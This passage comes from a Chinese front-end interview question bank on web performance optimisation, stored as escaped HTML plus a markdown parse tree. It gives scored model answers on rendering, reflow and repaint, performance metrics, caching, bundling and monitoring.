text\\"></p>\\n</li>\\n<li><p><strong>2：</strong> 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n<img src=\\"/public/images/Lighthouse.png\\" alt=\\"alt text\\"></p>\\n</li>\\n</ul>\\n<h2>如何优化前端性能？列举一些常见的性能优化策略</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（10 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。</li>\\n<li><strong>1：</strong>  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。</li>\\n<li><strong>1：</strong> 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。</li>\\n<li><strong>1：</strong> 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。</li>\\n<li><strong>1：</strong> 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。</li>\\n<li><strong>1：</strong> 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。</li>\\n<li><strong>1：</strong> 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。</li>\\n<li><strong>1：</strong> 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。</li>\\n<li><strong>1：</strong> 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。</li>\\n<li><strong>1：</strong> 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。</li>\\n</ul>\\n<h2>介绍一下浏览器渲染过程</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>5：</strong> 浏览器的渲染过程主要包括以下几个步骤：</li>\\n</ul>\\n<blockquote>\\n<p>构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。<br>构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。<br>合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。<br>布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。<br>绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  </p>\\n</blockquote>\\n<h2>如何减少页面渲染时间？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  </li>\\n<li><strong>1：</strong> 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  </li>\\n<li><strong>1：</strong> 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  </li>\\n<li><strong>1：</strong> 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  </li>\\n<li><strong>1：</strong> 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  </li>\\n<li><strong>1：</strong> 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。</li>\\n</ul>\\n<h2>如何进行前端代码的打包和压缩，提高页面加载速度？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。</li>\\n<li><strong>1：</strong> 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。</li>\\n<li><strong>1：</strong> 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。</li>\\n<li><strong>1：</strong> 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。</li>\\n<li><strong>1：</strong> 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。</li>\\n<li><strong>1：</strong> 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。</li>\\n<li><strong>1：</strong> CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。</li>\\n</ul>\\n<h2>如何实现前端性能监控？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。</li>\\n<li><strong>1：</strong> 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。</li>\\n<li><strong>1：</strong> 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。</li>\\n<li><strong>1：</strong> 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。</li>\\n</ul>\\n<h2>如何进行前端网络优化</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用CDN加速静态资源的加载，减少网络延迟。</li>\\n<li><strong>1：</strong> 启用HTTP/2协议，提高多个资源并行加载的效率。</li>\\n<li><strong>1：</strong> 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。</li>\\n<li><strong>1：</strong> 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。</li>\\n<li><strong>1：</strong> 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。</li>\\n</ul>\\n<h2>如何进行前端资源加载优化</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 延迟加载非关键资源，如图片、视频等，提高页面加载速度。</li>\\n<li><strong>1：</strong> 使用懒加载技术，按需加载页面内容，减少首次加载时间。</li>\\n<li><strong>1：</strong> 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。</li>\\n<li><strong>1：</strong> 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。</li>\\n</ul>\\n<h2>前端错误监控的方案</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。</li>\\n<li><strong>1：</strong> JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。</li>\\n<li><strong>1：</strong> 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。</li>\\n<li><strong>1：</strong> 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。</li>\\n</ul>\\n<h2>如何减少页面的回流和重绘？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 合并DOM操作：</p>\\n<ul>\\n<li>使用文档片段（DocumentFragment）批量插入节点</li>\\n<li>使用innerHTML一次性插入大量内容</li>\\n<li>使用display: none隐藏元素后再进行多次操作，最后再显示</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 缓存布局信息：</p>\\n<ul>\\n<li>避免在循环中多次读取offset、scroll等属性</li>\\n<li>使用变量缓存布局信息</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用CSS3特性：</p>\\n<ul>\\n<li>使用transform和opacity替代top、left等属性</li>\\n<li>使用will-change提示浏览器优化</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 减少复杂的选择器：</p>\\n<ul>\\n<li>避免使用过于复杂的CSS选择器</li>\\n<li>使用类选择器代替后代选择器</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 优化动画和过渡：</p>\\n<ul>\\n<li>使用requestAnimationFrame进行动画</li>\\n<li>避免在动画中使用高开销的CSS属性</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>如何优化首屏加载时间？</h2>\\n<h4>类型：<code>高级</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 资源压缩与合并：</p>\\n<ul>\\n<li>使用工具压缩JavaScript、CSS和HTML</li>\\n<li>合并多个CSS和JavaScript文件</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用CDN：</p>\\n<ul>\\n<li>将静态资源托管到CDN上</li>\\n<li>减少资源加载的延迟</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 图片优化：</p>\\n<ul>\\n<li>使用合适的图片格式（如WebP）</li>\\n<li>使用图片懒加载</li>\\n<li>使用CSS Sprites合并小图标</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 服务器端渲染（SSR）：</p>\\n<ul>\\n<li>使用SSR生成首屏HTML</li>\\n<li>减少客户端渲染的时间</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 减少HTTP请求：</p>\\n<ul>\\n<li>使用HTTP/2多路复用</li>\\n<li>合并请求，减少请求数量</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>如何进行JavaScript性能优化？</h2>\\n<h4>类型：<code>高级</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 减少作用域链查找：</p>\\n<ul>\\n<li>使用局部变量缓存全局变量</li>\\n<li>避免在循环中访问全局变量</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 避免不必要的计算：</p>\\n<ul>\\n<li>使用缓存存储计算结果</li>\\n<li>使用位运算替代数学运算</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 优化循环：</p>\\n<ul>\\n<li>使用for循环代替forEach、map等</li>\\n<li>在循环中缓存数组长度</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用异步编程：</p>\\n<ul>\\n<li>使用Promise、async/await优化异步操作</li>\\n<li>使用Web Workers进行多线程计算</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 减少内存泄漏：</p>\\n<ul>\\n<li>使用WeakMap、WeakSet管理对象引用</li>\\n<li>清理不再使用的事件监听器</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用现代JavaScript特性：</p>\\n<ul>\\n<li>使用ES6+特性优化代码结构</li>\\n<li>使用模块化提高代码可维护性</li>\\n</ul>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# 前端性能优化\\n\\n","depth":1,"text":"前端性能优化","tokens":[{"type":"text","raw":"前端性能优化","text":"前端性能优化","escaped":false}]},{"type":"heading","raw":"## 回流重绘\\n\\n","depth":2,"text":"回流重绘","tokens":[{"type":"text","raw":"回流重绘","text":"回流重绘","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 回流：浏览器渲染页面之前需要对结构进行布局计算\\n- **1：** 重绘：将已经计算好布局的容器绘制出来\\n\\n- **1：** 触发回流：页面上有容器的几何属性发生变更\\n- **1：** 触发重绘：容器非几何属性变更 （字体，颜色）\\n\\n- **1：** 回流必定重绘，重绘不一定回流","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 回流：浏览器渲染页面之前需要对结构进行布局计算\\n","task":false,"loose":true,"text":"**1：** 回流：浏览器渲染页面之前需要对结构进行布局计算","tokens":[{"type":"text","raw":"**1：** 回流：浏览器渲染页面之前需要对结构进行布局计算","text":"**1：** 回流：浏览器渲染页面之前需要对结构进行布局计算","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 回流：浏览器渲染页面之前需要对结构进行布局计算","text":" 回流：浏览器渲染页面之前需要对结构进行布局计算","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 重绘：将已经计算好布局的容器绘制出来\\n\\n","task":false,"loose":true,"text":"**1：** 重绘：将已经计算好布局的容器绘制出来\\n","tokens":[{"type":"text","raw":"**1：** 重绘：将已经计算好布局的容器绘制出来\\n","text":"**1：** 重绘：将已经计算好布局的容器绘制出来","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 重绘：将已经计算好布局的容器绘制出来","text":" 重绘：将已经计算好布局的容器绘制出来","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 触发回流：页面上有容器的几何属性发生变更\\n","task":false,"loose":true,"text":"**1：** 触发回流：页面上有容器的几何属性发生变更","tokens":[{"type":"text","raw":"**1：** 触发回流：页面上有容器的几何属性发生变更","text":"**1：** 触发回流：页面上有容器的几何属性发生变更","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 触发回流：页面上有容器的几何属性发生变更","text":" 触发回流：页面上有容器的几何属性发生变更","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 触发重绘：容器非几何属性变更 （字体，颜色）\\n\\n","task":false,"loose":true,"text":"**1：** 触发重绘：容器非几何属性变更 （字体，颜色）\\n","tokens":[{"type":"text","raw":"**1：** 触发重绘：容器非几何属性变更 （字体，颜色）\\n","text":"**1：** 触发重绘：容器非几何属性变更 （字体，颜色）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 触发重绘：容器非几何属性变更 （字体，颜色）","text":" 触发重绘：容器非几何属性变更 （字体，颜色）","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 回流必定重绘，重绘不一定回流","task":false,"loose":true,"text":"**1：** 回流必定重绘，重绘不一定回流","tokens":[{"type":"text","raw":"**1：** 回流必定重绘，重绘不一定回流","text":"**1：** 回流必定重绘，重绘不一定回流","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 回流必定重绘，重绘不一定回流","text":" 回流必定重绘，重绘不一定回流","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 前端性能指标有哪些？\\n\\n","depth":2,"text":"前端性能指标有哪些？","tokens":[{"type":"text","raw":"前端性能指标有哪些？","text":"前端性能指标有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（11 分）\\n\\n","depth":4,"text":"解答（11 分）","tokens":[{"type":"text","raw":"解答（11 分）","text":"解答（11 分）","escaped":false}]},{"type":"list","raw":"- **1：** FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。\\n- **1：** LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。\\n- **1：** TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。\\n- **1：** TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。\\n- **1：** FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。\\n- **1：** FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。\\n- **1：** SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。\\n- **1：** CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。\\n- **1：** INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。\\n- **1：** FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。\\n- **1：** TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。\\n","task":false,"loose":false,"text":"**1：** FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。","tokens":[{"type":"text","raw":"**1：** FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。","text":"**1：** FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。","text":" FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。\\n","task":false,"loose":false,"text":"**1：** LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。","tokens":[{"type":"text","raw":"**1：** LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。","text":"**1：** LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。","text":" LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。\\n","task":false,"loose":false,"text":"**1：** TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。","tokens":[{"type":"text","raw":"**1：** TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。","text":"**1：** TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。","text":" TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。\\n","task":false,"loose":false,"text":"**1：** TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。","tokens":[{"type":"text","raw":"**1：** TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。","text":"**1：** TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。","text":" TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。\\n","task":false,"loose":false,"text":"**1：** FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。","tokens":[{"type":"text","raw":"**1：** FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。","text":"**1：** FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。","text":" FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。\\n","task":false,"loose":false,"text":"**1：** FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。","tokens":[{"type":"text","raw":"**1：** FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。","text":"**1：** FP：全称为 First 